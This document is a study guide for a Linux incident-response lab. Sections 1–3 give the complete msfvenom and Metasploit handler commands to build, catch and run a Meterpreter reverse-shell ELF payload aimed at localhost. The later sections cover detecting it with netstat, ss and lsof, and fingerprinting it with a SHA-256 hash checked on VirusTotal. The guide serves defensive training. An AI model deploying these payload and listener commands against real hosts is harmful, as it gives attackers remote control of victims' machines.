# Linux Network Analysis


## 1. Lab Setup — Generating the "Malware"

The lab simulates a real-world scenario: a reverse TCP payload is dropped on a Linux host, and the analyst must identify it using only built-in OS tools (no EDR/AV).

```bash
cd malware/
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o notmalware.elf
```

**What this does:**
- `msfvenom` is the Metasploit payload generator.
- `-p linux/x64/meterpreter/reverse_tcp` selects a Meterpreter reverse TCP payload for 64-bit Linux — once executed, the target connects *back* to the attacker (reverse shell), which is far more likely to bypass firewalls/NAT than a bind shell.
- `LHOST` / `LPORT` define where the payload will call back to (here, localhost, for lab purposes).
- `-f elf` outputs an ELF executable (native Linux binary format).
- `-o notmalware.elf` names the output file.

Run `ls` afterward — you'll see `notmalware.elf` in the directory (the `.exe` mentioned is likely a leftover/Windows payload from a parallel lab, not relevant to this ELF binary).

> **MITRE ATT&CK reference:** T1587.001 (Develop Capabilities: Malware) — for the attacker side, generating custom payloads to evade signature-based detection.

---

## 2. Setting Up the Listener (Attacker Side)

In a **second terminal**, still inside `/malware`:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit
```

**What this does:**
- `msfconsole -q` launches the Metasploit Framework console in quiet mode (no banner).
- `exploit/multi/handler` is a generic "catcher" module — it doesn't exploit anything itself, it just listens for an incoming connection matching the configured payload.
- Setting `PAYLOAD`, `LHOST`, and `LPORT` to match what was embedded in `notmalware.elf` ensures that when the binary runs, the handler recognizes and catches the callback.
- `exploit` starts the listener, which now waits silently for a connection on `127.0.0.1:4444`.

> **MITRE ATT&CK reference:** T1071.001 (Application Layer Protocol) — the C2 channel that will be established once the payload calls home.

---

## 3. Preparing and Executing the Payload

Back in the **first terminal**:

```bash
ls -al
```

Example output:
```
total 88
drwxrwxr-x 2 tcm tcm 4096 Jul 7 15:25 .
drwxrwxr-x 6 tcm tcm 4096 Jul 7 15:20 ..
-rwxrwxr-x 1 tcm tcm 12345 Jul 7 15:25 notmalware.elf
```

Notice the file does **not** yet have execute permissions for all relevant contexts (this depends on `umask`), so:

```bash
clear
chmod +x notmalware.elf
ls -al
```

**What this does:**
- `chmod +x` adds the executable bit to the file, allowing it to be run directly. This is a deliberate, necessary step on Linux — unlike Windows, a downloaded file isn't executable by default, which is actually a small built-in defense layer (and a detection opportunity: file permission changes shortly before execution are suspicious).
- Running `ls -al` again confirms the permission bits changed (e.g., `-rwxrwxr-x`).

Then execute the payload:

```bash
./notmalware.elf
```

This runs the binary, which immediately attempts its reverse TCP connection to `127.0.0.1:4444` — caught by the `multi/handler` listener set up in Step 2. On the Metasploit side, you'd see a `Meterpreter session opened` message.

> **MITRE ATT&CK reference:** T1204.002 (User Execution: Malicious File) and T1059.004 (Command and Scripting Interpreter: Unix Shell) once the session is established.

---

## 4. Network Analysis — Identifying the Connection

Now open a **third terminal** to act as the analyst/defender, investigating the system *without* knowing in advance what's running.

### 4.1 `netstat`

```bash
sudo netstat -tn
```

**What this does:**
- `-t` — show only TCP connections.
- `-n` — show numerical addresses/ports instead of resolving hostnames (faster, and avoids tipping off DNS-based detections).

Output will include a line like:
```
tcp        0      0 127.0.0.1:4444          127.0.0.1:52344         ESTABLISHED
```
This is the live reverse shell connection — port 4444 should immediately stand out as unusual (not a "well-known" service port).

To generate some background noise for comparison, the lab has you visit `example.com` in a browser, then re-run:

```bash
sudo netstat -tnp
```

**What this does:**
- The added `-p` flag shows the **PID/process name** owning each connection — critical for going from "there's a weird connection" to "here's the process responsible for it." Without `-p`, you only see IPs/ports, not which program is talking.

You'll now see many more entries (browser connections to various web services) alongside the suspicious `127.0.0.1:4444` connection, now annotated with a PID and process name (e.g., `3610/notmalware.el`).

> **Detection tip:** A process listening or connecting on a non-standard, high-numbered port, especially with a generic or copycat-sounding binary name like `notmalware.elf`, is a major red flag during triage.

### 4.2 `ss` (modern netstat replacement)

```bash
clear
sudo ss -tnp
```

`ss` ("socket statistics") is the modern, faster replacement for `netstat` on most current Linux distros — `netstat` is technically deprecated in favor of `ss`. Same flags, same logic: TCP, numeric, with process info.

You can also filter directly instead of scrolling through everything:

```bash
sudo ss src 127.0.0.1
sudo ss dst 127.0.0.1
sudo ss dport == 4444 -tnp
```

**What these do:**
- `src 127.0.0.1` — show only connections **originating** from that address.
- `dst 127.0.0.1` — show only connections **destined to** that address.
- `dport == 4444 -tnp` — filter precisely to the destination port of interest (4444), with TCP/numeric/process info — isolating exactly the connection tied to the payload.

This filtering approach is what you'd realistically use on a busy production server with hundreds of connections, where scrolling through raw `netstat` output isn't practical.

---

## 5. Process Analysis — `lsof`

`lsof` ("list open files") is useful because on Linux, *everything is a file* — including network sockets. This lets you pivot from network info to process info and vice versa.

```bash
sudo lsof -u tcm
```
Lists all files (including sockets) opened by the user `tcm` — useful when you suspect a specific user account is compromised or running something malicious.

```bash
sudo lsof -i -n -P
```
**What this does:**
- `-i` — limit output to **network files** (sockets) only.
- `-n` — don't resolve hostnames (numeric IPs, faster).
- `-P` — don't resolve port names (e.g., shows `4444` instead of trying to map it to a service name).

This gives a clean list of every process with an active network connection or listening socket — including, again, `notmalware.elf` bound to port 4444.

```bash
sudo lsof -p 3610
```
Once you've identified the suspicious PID (3610 in this example) from the previous outputs, this shows **every file that specific process has open** — including its executable path, working directory, shared libraries, and any open sockets. This is how you discover the full path of the binary, e.g.:
```
/home/tcm/malware/notmalware.elf
```

---

## 6. Hashing and Threat Intel Lookup

Once the file path is known:

```bash
sha256sum /home/tcm/malware/notmalware.elf
```

**What this does:**
- Computes the SHA-256 cryptographic hash of the file — a unique fingerprint. Even a single byte of difference produces a completely different hash, which is why hashing is the standard way to identify/share IOCs (Indicators of Compromise) without sharing the actual malicious file.

The resulting hash is then pasted into **VirusTotal** (virustotal.com), which checks it against dozens of AV engines and threat intel feeds. This tells you:
- Whether the file is already known/flagged by the security community.
- Which AV vendors detect it and under what malware family name.
- Useful pivot info (first seen date, related samples, etc.).

> **MITRE ATT&CK reference:** This whole final phase maps to defensive use of **T1592 / threat intel correlation**, and operationally aligns with incident response triage workflows (identify → contain → analyze → report).

> **Note:** Since `notmalware.elf` was generated with default `msfvenom` settings (no encoding/obfuscation), it will almost certainly be flagged by most AV engines on VirusTotal — real-world attackers use encoders, packers, or custom payloads specifically to evade this kind of signature detection.

---

## 7. Summary — Investigation Workflow

| Step | Tool | Purpose |
|------|------|---------|
| 1 | `msfvenom` | (Attacker) Generate the malicious ELF payload |
| 2 | `msfconsole` / `multi/handler` | (Attacker) Set up listener to catch the callback |
| 3 | `chmod +x` + execution | Run the payload, triggering the reverse connection |
| 4 | `netstat -tnp` / `ss -tnp` | Identify the suspicious network connection and owning process |
| 5 | `lsof -i -n -P` / `lsof -p <PID>` | Pivot from connection to process to full file path |
| 6 | `sha256sum` + VirusTotal | Fingerprint the file and check it against threat intelligence |

**Key takeaway:** Even without specialized EDR tooling, native Linux utilities (`netstat`, `ss`, `lsof`) are enough to detect, trace, and fingerprint a live reverse shell — going from "something looks off on the network" all the way to "here's the exact malicious file and its known reputation."

---

## 8. Additional Notes / Things Worth Adding to Your Study

- **`ss` vs `netstat`**: most modern distros (Debian/Ubuntu included) ship `ss` by default and consider `netstat` part of the deprecated `net-tools` package — worth knowing both, but `ss` is the one to master for real environments.
- **Persistence check**: this lab only covers the *live* connection/process. In a real investigation, you'd also check for persistence mechanisms (cron jobs, systemd services, `.bashrc` modifications, etc.) to see if the attacker set up a way to regain access after reboot.
- **`netstat -tnp` / `ss -tnp` require root** (or `sudo`) to show the owning process for connections that don't belong to your own user — this is why every command above is prefixed with `sudo`.
- **Logging context**: in a real incident, you'd correlate this live process/network data with auth logs (`/var/log/auth.log`), shell history, and (if available) Sysmon-for-Linux or `auditd` logs for a full timeline of how the binary arrived and was executed.
